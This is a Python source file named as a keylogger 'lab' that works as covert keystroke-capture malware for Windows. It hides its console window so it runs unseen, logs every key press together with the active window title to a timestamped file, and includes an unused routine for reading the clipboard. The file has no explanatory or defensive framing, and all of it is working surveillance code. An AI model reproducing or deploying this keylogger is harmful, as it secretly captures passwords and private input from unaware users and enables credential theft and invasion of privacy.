# keylogger_lab.py

from pynput import keyboard
import win32gui
import win32clipboard
import logging
import ctypes
from datetime import datetime

# -------------------------
# Hide the console window
# -------------------------
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# -------------------------
# Set up logging
# -------------------------
filename = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
logging.basicConfig(
    filename=filename,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

# -------------------------
# Get active window title
# -------------------------
def get_active_window_title():
    try:
        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window)
        return title if title else "No Active Window"
    except Exception as e:
        return f"Error getting window title: {e}"

# -------------------------
# Read clipboard contents
# -------------------------
def get_clipboard_data():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data
    except Exception as e:
        return f"Clipboard read error: {e}"

# -------------------------
# Key press handler
# -------------------------
def on_press(key):
    try:
        window_title = get_active_window_title()
        if hasattr(key, 'char') and key.char:
            logging.info(f"\n[Window]: {window_title}")
            logging.info(f"Key: {key.char}")
        else:
            logging.info(f"\n[Window]: {window_title}")
            logging.info(f"Special Key: {key}")
    except Exception as e:
        logging.error(f"Error capturing key: {e}")

# -------------------------
# Main function
# -------------------------
def main():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# -------------------------
# Entry point
# -------------------------
if __name__ == "__main__":
    main()
